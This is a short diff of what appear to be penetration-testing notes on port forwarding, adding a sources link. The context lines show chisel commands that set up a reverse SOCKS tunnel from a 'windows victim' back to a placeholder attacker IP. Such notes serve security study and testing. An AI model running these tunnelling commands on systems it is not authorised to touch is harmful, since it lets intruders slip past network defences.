@@ -18,3 +18,9 @@ chisel server --socks5 --reverse -p 1234
 # windows victim
 chiselx86_64.exe client <attacker ip>:1234 R:9090:127.0.0.1:9090
 ```
+
+
+## Sources {#sources}
+
+
+### [twelvesec](https://github.com/twelvesec/port-forwarding?tab=readme-ov-file) {#twelvesec}
